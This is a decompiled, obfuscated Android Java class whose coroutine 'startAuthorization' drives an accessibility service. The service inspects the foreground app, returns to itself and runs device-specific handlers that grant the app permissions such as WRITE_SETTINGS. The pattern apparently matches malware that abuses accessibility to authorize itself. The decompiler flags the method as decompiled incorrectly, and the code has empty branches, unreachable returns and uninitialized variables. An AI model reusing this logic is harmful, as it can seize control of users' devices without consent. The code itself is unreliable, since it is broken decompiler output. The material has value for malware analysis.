package com.storm.safe.rock.service.modules;

import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.base.AbstractC0330a0;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;
import kotlin.collections.EmptyList;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.AbstractC1117qo;
import p000.C0147bu;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.obzzniixzpin$startAuthorization$1", m214403f = "obzzniixzpin.kt", m214404l = {132, 138, 140, 186}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class obzzniixzpin$startAuthorization$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public Serializable f53602a1;

    /* renamed from: a2 */
    public ArrayList f53603a2;

    /* renamed from: a3 */
    public ArrayList f53604a3;

    /* renamed from: a4 */
    public int f53605a4;

    /* renamed from: a5 */
    public final /* synthetic */ C0329b4 f53606a5;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public obzzniixzpin$startAuthorization$1(C0329b4 c0329b4, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53606a5 = c0329b4;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new obzzniixzpin$startAuthorization$1(this.f53606a5, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((obzzniixzpin$startAuthorization$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Removed duplicated region for block: B:101:0x020e  */
    /* JADX WARN: Removed duplicated region for block: B:118:0x0116 A[EXC_TOP_SPLITTER, PHI: r10
      0x0116: PHI (r10v9 java.lang.String) = 
      (r10v5 java.lang.String)
      (r10v10 java.lang.String)
      (r10v10 java.lang.String)
      (r10v11 java.lang.String)
      (r10v15 java.lang.String)
     binds: [B:59:0x00f5, B:54:0x00e5, B:56:0x00f0, B:62:0x0111, B:19:0x004a] A[DONT_GENERATE, DONT_INLINE], SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:41:0x0094  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x00a9  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x00e7 A[Catch: all -> 0x003b, Exception -> 0x00f4, TRY_LEAVE, TryCatch #9 {all -> 0x003b, blocks: (B:11:0x0033, B:89:0x01b8, B:96:0x01ef, B:98:0x0206, B:102:0x020f, B:104:0x0219, B:106:0x021f, B:95:0x01bf, B:19:0x004a, B:63:0x0116, B:65:0x0120, B:67:0x0126, B:71:0x012e, B:72:0x0139, B:76:0x0145, B:78:0x015a, B:81:0x0178, B:83:0x0184, B:85:0x01a7, B:75:0x0140, B:59:0x00f5, B:22:0x0054, B:53:0x00d0, B:55:0x00e7, B:25:0x0060, B:47:0x00ab, B:49:0x00b9, B:50:0x00be, B:62:0x0111, B:108:0x0234, B:30:0x006c, B:31:0x0072, B:35:0x007e, B:37:0x0088, B:39:0x008e, B:42:0x0095, B:44:0x00a3, B:34:0x0079), top: B:120:0x001e }] */
    /* JADX WARN: Removed duplicated region for block: B:65:0x0120 A[Catch: all -> 0x003b, Exception -> 0x012e, TryCatch #2 {Exception -> 0x012e, blocks: (B:63:0x0116, B:65:0x0120, B:67:0x0126), top: B:118:0x0116 }] */
    /* JADX WARN: Removed duplicated region for block: B:70:0x012d  */
    /* JADX WARN: Removed duplicated region for block: B:78:0x015a A[Catch: all -> 0x003b, Exception -> 0x010e, TRY_LEAVE, TryCatch #3 {Exception -> 0x010e, blocks: (B:96:0x01ef, B:98:0x0206, B:102:0x020f, B:104:0x0219, B:106:0x021f, B:95:0x01bf, B:71:0x012e, B:76:0x0145, B:78:0x015a, B:81:0x0178, B:83:0x0184, B:75:0x0140, B:59:0x00f5, B:47:0x00ab, B:49:0x00b9, B:62:0x0111, B:44:0x00a3), top: B:120:0x001e }] */
    /* JADX WARN: Removed duplicated region for block: B:81:0x0178 A[Catch: all -> 0x003b, Exception -> 0x010e, TRY_ENTER, TryCatch #3 {Exception -> 0x010e, blocks: (B:96:0x01ef, B:98:0x0206, B:102:0x020f, B:104:0x0219, B:106:0x021f, B:95:0x01bf, B:71:0x012e, B:76:0x0145, B:78:0x015a, B:81:0x0178, B:83:0x0184, B:75:0x0140, B:59:0x00f5, B:47:0x00ab, B:49:0x00b9, B:62:0x0111, B:44:0x00a3), top: B:120:0x001e }] */
    /* JADX WARN: Removed duplicated region for block: B:98:0x0206 A[Catch: all -> 0x003b, Exception -> 0x010e, TryCatch #3 {Exception -> 0x010e, blocks: (B:96:0x01ef, B:98:0x0206, B:102:0x020f, B:104:0x0219, B:106:0x021f, B:95:0x01bf, B:71:0x012e, B:76:0x0145, B:78:0x015a, B:81:0x0178, B:83:0x0184, B:75:0x0140, B:59:0x00f5, B:47:0x00ab, B:49:0x00b9, B:62:0x0111, B:44:0x00a3), top: B:120:0x001e }] */
    /* JADX WARN: Type inference failed for: r8v1 */
    /* JADX WARN: Type inference failed for: r8v3 */
    /* JADX WARN: Type inference failed for: r8v4, types: [java.io.Serializable, java.util.ArrayList, java.util.List] */
    /* JADX WARN: Type inference failed for: r8v6, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r8v7 */
    /* JADX WARN: Type inference failed for: r8v8 */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        String string;
        String str;
        AccessibilityNodeInfo rootInActiveWindow;
        CharSequence packageName;
        Exception e;
        ?? arrayList;
        ArrayList arrayList2;
        ArrayList arrayList3;
        Exception e2;
        C0147bu c0147bu;
        List list;
        Object objM211770a1;
        String strM211765a3;
        AccessibilityNodeInfo rootInActiveWindow2;
        CharSequence packageName2;
        String string2;
        Object objM211524m1;
        boolean zBooleanValue;
        C1351vv c1351vv = C1351vv.f60710b1;
        String str2 = "🔍 [授权开始] 当前页面: ";
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f53605a4;
        String str3 = "";
        try {
            try {
                try {
                } catch (Exception e3) {
                    e = e3;
                    t60.m214705c6(str2, "❌ 授权流程执行失败: " + e.getMessage(), e);
                    return c1351vv;
                }
            } catch (Exception e4) {
                e = e4;
                str2 = "obzzniixzpin";
                t60.m214705c6(str2, "❌ 授权流程执行失败: " + e.getMessage(), e);
                return c1351vv;
            }
            if (i == 0) {
                kg1.m213544f4(obj);
                this.f53606a5.f53200a5 = true;
                try {
                    this.f53606a5.f53195a0.m211454e3();
                } catch (Exception e5) {
                    t60.m214705c6("obzzniixzpin", "❌ 关闭无障碍设置页面检测失败", e5);
                }
                try {
                    rootInActiveWindow = this.f53606a5.f53195a0.getRootInActiveWindow();
                } catch (Exception unused) {
                }
                if (rootInActiveWindow == null || (packageName = rootInActiveWindow.getPackageName()) == null) {
                    string = "";
                    t60.m214714d6("obzzniixzpin", "🔍 [授权开始] 当前页面: ".concat(string));
                    this.f53602a1 = string;
                    this.f53605a4 = 1;
                    str = "obzzniixzpin";
                    if (b81.m210571b1(300L, this) != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                string = packageName.toString();
                if (string == null) {
                }
                t60.m214714d6("obzzniixzpin", "🔍 [授权开始] 当前页面: ".concat(string));
                this.f53602a1 = string;
                this.f53605a4 = 1;
                str = "obzzniixzpin";
                if (b81.m210571b1(300L, this) != coroutineSingletons) {
                }
                return coroutineSingletons;
                return c1351vv;
            }
            if (i != 1) {
                try {
                } catch (Exception e6) {
                    e = e6;
                    str = "obzzniixzpin";
                    t60.m214726f4(str, "⚠️ [授权] 返回APP异常: " + e.getMessage() + "，继续执行");
                    try {
                        rootInActiveWindow2 = this.f53606a5.f53195a0.getRootInActiveWindow();
                        if (rootInActiveWindow2 != null) {
                        }
                    } catch (Exception unused2) {
                    }
                    t60.m214714d6(str, "🔍 [授权] 返回后当前页面: ".concat(str3));
                    C0329b4 c0329b4 = this.f53606a5;
                    int i2 = C0329b4.f53194a6;
                    try {
                        c0329b4.f53195a0.m211496j0();
                    } catch (Exception e7) {
                        t60.m214705c6(str, "❌ 暂停WRITE_SETTINGS权限申请失败", e7);
                    }
                    arrayList = new ArrayList();
                    arrayList2 = new ArrayList();
                    ArrayList arrayList4 = new ArrayList();
                    strM211765a3 = C0329b4.m211765a3();
                    if (strM211765a3 == null) {
                    }
                    return c1351vv;
                }
                if (i == 2) {
                    kg1.m213544f4(obj);
                    objM211524m1 = obj;
                    str = "obzzniixzpin";
                    zBooleanValue = ((Boolean) objM211524m1).booleanValue();
                    t60.m214714d6(str, "📱 [授权] smartReturnToApp() 返回=" + zBooleanValue);
                    if (!zBooleanValue) {
                        this.f53605a4 = 3;
                        if (b81.m210571b1(300L, this) != coroutineSingletons) {
                            rootInActiveWindow2 = this.f53606a5.f53195a0.getRootInActiveWindow();
                            if (rootInActiveWindow2 != null) {
                                string2 = packageName2.toString();
                                if (string2 != null) {
                                }
                            }
                            t60.m214714d6(str, "🔍 [授权] 返回后当前页面: ".concat(str3));
                            C0329b4 c0329b42 = this.f53606a5;
                            int i22 = C0329b4.f53194a6;
                            c0329b42.f53195a0.m211496j0();
                            arrayList = new ArrayList();
                            arrayList2 = new ArrayList();
                            ArrayList arrayList42 = new ArrayList();
                            strM211765a3 = C0329b4.m211765a3();
                            if (strM211765a3 == null) {
                            }
                            return c1351vv;
                        }
                        return coroutineSingletons;
                    }
                    return c1351vv;
                }
                if (i != 3) {
                    if (i != 4) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    arrayList3 = this.f53604a3;
                    arrayList2 = this.f53603a2;
                    arrayList = (List) this.f53602a1;
                    try {
                        kg1.m213544f4(obj);
                        objM211770a1 = obj;
                        str = "obzzniixzpin";
                        arrayList = arrayList;
                    } catch (Exception e8) {
                        e2 = e8;
                        str = "obzzniixzpin";
                        t60.m214705c6(str, "❌ 授权执行异常: " + e2.getMessage(), e2);
                        EmptyList emptyList = EmptyList.f57568a0;
                        c0147bu = new C0147bu(false, emptyList, AbstractC1117qo.m214451e7("执行异常: " + e2.getMessage()), emptyList);
                        list = arrayList;
                        list.addAll(c0147bu.f46001a1);
                        arrayList2.addAll(c0147bu.f46002a2);
                        arrayList3.addAll(c0147bu.f46003a3);
                        return c1351vv;
                    }
                    try {
                        c0147bu = (C0147bu) objM211770a1;
                        list = arrayList;
                    } catch (Exception e9) {
                        e2 = e9;
                        t60.m214705c6(str, "❌ 授权执行异常: " + e2.getMessage(), e2);
                        EmptyList emptyList2 = EmptyList.f57568a0;
                        c0147bu = new C0147bu(false, emptyList2, AbstractC1117qo.m214451e7("执行异常: " + e2.getMessage()), emptyList2);
                        list = arrayList;
                        list.addAll(c0147bu.f46001a1);
                        arrayList2.addAll(c0147bu.f46002a2);
                        arrayList3.addAll(c0147bu.f46003a3);
                        return c1351vv;
                    }
                    list.addAll(c0147bu.f46001a1);
                    arrayList2.addAll(c0147bu.f46002a2);
                    arrayList3.addAll(c0147bu.f46003a3);
                    C0329b4.m211762a0(this.f53606a5, new C0147bu(c0147bu.f46000a0 && arrayList2.isEmpty(), list, arrayList2, arrayList3));
                    if (c0147bu.f46000a0 && arrayList2.isEmpty()) {
                        C0329b4.m211763a1(this.f53606a5);
                    }
                    return c1351vv;
                }
                kg1.m213544f4(obj);
                str = "obzzniixzpin";
                rootInActiveWindow2 = this.f53606a5.f53195a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null && (packageName2 = rootInActiveWindow2.getPackageName()) != null) {
                    string2 = packageName2.toString();
                    if (string2 != null) {
                        str3 = string2;
                    }
                }
                t60.m214714d6(str, "🔍 [授权] 返回后当前页面: ".concat(str3));
                C0329b4 c0329b422 = this.f53606a5;
                int i222 = C0329b4.f53194a6;
                c0329b422.f53195a0.m211496j0();
                arrayList = new ArrayList();
                arrayList2 = new ArrayList();
                ArrayList arrayList422 = new ArrayList();
                strM211765a3 = C0329b4.m211765a3();
                if (strM211765a3 == null) {
                    C0329b4.m211762a0(this.f53606a5, new C0147bu(arrayList2.isEmpty(), arrayList, arrayList2, arrayList422));
                } else {
                    AbstractC0330a0 abstractC0330a0 = (AbstractC0330a0) this.f53606a5.f53198a3.get(strM211765a3);
                    if (abstractC0330a0 != null) {
                        try {
                            this.f53602a1 = arrayList;
                            this.f53603a2 = arrayList2;
                            this.f53604a3 = arrayList422;
                            this.f53605a4 = 4;
                            objM211770a1 = abstractC0330a0.m211770a1(this);
                        } catch (Exception e10) {
                            e2 = e10;
                            arrayList3 = arrayList422;
                            t60.m214705c6(str, "❌ 授权执行异常: " + e2.getMessage(), e2);
                            EmptyList emptyList22 = EmptyList.f57568a0;
                            c0147bu = new C0147bu(false, emptyList22, AbstractC1117qo.m214451e7("执行异常: " + e2.getMessage()), emptyList22);
                            list = arrayList;
                            list.addAll(c0147bu.f46001a1);
                            arrayList2.addAll(c0147bu.f46002a2);
                            arrayList3.addAll(c0147bu.f46003a3);
                            return c1351vv;
                        }
                        if (objM211770a1 != coroutineSingletons) {
                            arrayList3 = arrayList422;
                            arrayList = arrayList;
                            c0147bu = (C0147bu) objM211770a1;
                            list = arrayList;
                            list.addAll(c0147bu.f46001a1);
                            arrayList2.addAll(c0147bu.f46002a2);
                            arrayList3.addAll(c0147bu.f46003a3);
                            if (c0147bu.f46000a0) {
                                C0329b4.m211762a0(this.f53606a5, new C0147bu(c0147bu.f46000a0 && arrayList2.isEmpty(), list, arrayList2, arrayList3));
                                if (c0147bu.f46000a0) {
                                    C0329b4.m211763a1(this.f53606a5);
                                }
                            }
                            return c1351vv;
                        }
                        return coroutineSingletons;
                    }
                    t60.m214726f4(str, "⚠️ [步骤2/2] 未找到设备处理器: " + strM211765a3 + "，仅完成基础权限");
                    C0329b4.m211762a0(this.f53606a5, new C0147bu(arrayList2.isEmpty(), arrayList, arrayList2, arrayList422));
                }
                return c1351vv;
            }
            string = (String) this.f53602a1;
            kg1.m213544f4(obj);
            str = "obzzniixzpin";
            if (t60.m214686a2(string, this.f53606a5.f53195a0.getPackageName())) {
                t60.m214714d6(str, "✅ [授权] 已在app，跳过返回");
                rootInActiveWindow2 = this.f53606a5.f53195a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                }
                t60.m214714d6(str, "🔍 [授权] 返回后当前页面: ".concat(str3));
                C0329b4 c0329b4222 = this.f53606a5;
                int i2222 = C0329b4.f53194a6;
                c0329b4222.f53195a0.m211496j0();
                arrayList = new ArrayList();
                arrayList2 = new ArrayList();
                ArrayList arrayList4222 = new ArrayList();
                strM211765a3 = C0329b4.m211765a3();
                if (strM211765a3 == null) {
                }
                return c1351vv;
            }
            t60.m214714d6(str, "📱 [授权] 不在app，执行 smartReturnToApp...");
            try {
                dqtvuisjd dqtvuisjdVar = this.f53606a5.f53195a0;
                this.f53602a1 = null;
                this.f53605a4 = 2;
                objM211524m1 = dqtvuisjdVar.m211524m1(this);
            } catch (Exception e11) {
                e = e11;
                t60.m214726f4(str, "⚠️ [授权] 返回APP异常: " + e.getMessage() + "，继续执行");
                rootInActiveWindow2 = this.f53606a5.f53195a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                }
                t60.m214714d6(str, "🔍 [授权] 返回后当前页面: ".concat(str3));
                C0329b4 c0329b42222 = this.f53606a5;
                int i22222 = C0329b4.f53194a6;
                c0329b42222.f53195a0.m211496j0();
                arrayList = new ArrayList();
                arrayList2 = new ArrayList();
                ArrayList arrayList42222 = new ArrayList();
                strM211765a3 = C0329b4.m211765a3();
                if (strM211765a3 == null) {
                }
                return c1351vv;
            }
            if (objM211524m1 != coroutineSingletons) {
                zBooleanValue = ((Boolean) objM211524m1).booleanValue();
                t60.m214714d6(str, "📱 [授权] smartReturnToApp() 返回=" + zBooleanValue);
                if (!zBooleanValue) {
                }
                return c1351vv;
            }
            return coroutineSingletons;
        } finally {
            this.f53606a5.f53200a5 = false;
            this.f53606a5.m211767a5();
            C0329b4.m211764a2(this.f53606a5);
        }
    }
}
